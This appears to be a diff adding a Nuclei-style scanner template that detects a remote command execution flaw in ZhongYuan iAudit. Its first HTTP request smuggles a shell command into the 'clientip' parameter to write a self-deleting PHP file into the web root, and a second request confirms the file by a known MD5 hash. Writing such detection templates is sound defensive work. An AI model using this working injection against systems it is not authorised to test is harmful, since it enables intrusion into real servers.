@@ -1,0 +1,38 @@
+id: zhongyuan-iaudit-rce
+info:
+  name: ZhongYuan iAudit Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The existence of command splicing in ZhongYuan iAudit's get_luser_by_sshport.php leads to a remote command execution vulnerability.
+  reference:
+    - http://wiki.peiqi.tech
+  tags: rce
+variables:
+  randstr_1: '{{rand_base(8)}}'
+flow: |
+  http(1) && http(2)
+http:
+  - id: first-request
+    raw:
+      - |
+        GET /get_luser_by_sshport.php?clientip=1;echo%20'%3C%3Fphp%20echo%20md5(38219)%3Bunlink(__FILE__)%3F%3E'>/opt/freesvr/web/htdocs/freesvr/audit/{{randstr_1}}.php;&clientport=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+    matchers:
+      - type: status
+        status: 200
+  - id: second-request
+    raw:
+      - |
+        GET /freesvr/audit/{{randstr_1}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        words:
+          - "c608f0780424e8d79ec470d7c8427520"
+        part: body
